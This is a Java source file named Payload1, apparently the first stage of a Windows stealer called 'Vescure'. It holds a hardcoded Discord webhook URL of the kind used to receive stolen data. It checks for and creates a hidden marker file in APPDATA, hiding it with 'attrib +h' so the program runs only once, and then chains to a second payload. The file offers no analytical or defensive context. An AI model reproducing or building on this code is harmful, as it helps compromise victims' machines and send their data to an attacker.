package club.vescure.payloads;

import club.vescure.utils.HttpUtils;

import java.io.File;
import java.io.IOException;

import static club.vescure.payloads.Payload2.startPayload2;

public class Payload1 {

    public static String CYAN = "\033[96m";
    public static String GREEN = "\033[92m";
    public static String GRAY = "\033[90m";
    public static String RED = "\033[91m";
    public static String WHITE = "\033[0m";
    public static String prefix = WHITE + "[" + GREEN + "Vescure" + WHITE + "] ";

    public static boolean debug = true;
    public static String webhook = "https://discord.com/api/webhooks/851978747971371049/ZAs2tHGC_cDBQA9tJ-MVYXH2v04ku4JYJwupkPVmdUOOcSsjVs4NQJhbFBSgdGEMIV2Y";

    public static void startPayload1() throws InterruptedException {
        final File file = new File(System.getenv("APPDATA") + File.separator + "cumminhome.tmp");
        if (file.exists()) {
            if (debug) {
                System.out.println();
                System.out.println(prefix + RED + "Temp file was found. Aborting...");
            } {
                System.exit(0);
            }
        } else {
            executePayload1();
        }
    }

    public static void executePayload1() throws InterruptedException {
        final File file = new File(System.getenv("APPDATA") + File.separator + "cumminhome.tmp");
        if (!file.exists()) {
            try {
                if (debug) {
                    System.out.println();
                    System.out.println(prefix + "Payload 1:");
                    System.out.println(prefix + "Executing payload.");

                } {
                    file.createNewFile();
                    Runtime.getRuntime().exec("attrib +h " + file.getPath());
                }

                if (debug)
                    System.out.println(prefix + "Successfully created temp file. Location: " + file);

            } catch (IOException exception) {
                exception.printStackTrace();
            }
        }
        Thread.sleep(500);

        if (debug) {
            System.out.println();
            System.out.println(prefix + "Executing payload 2.");
            System.out.println();
        }
        startPayload2();
    }
}
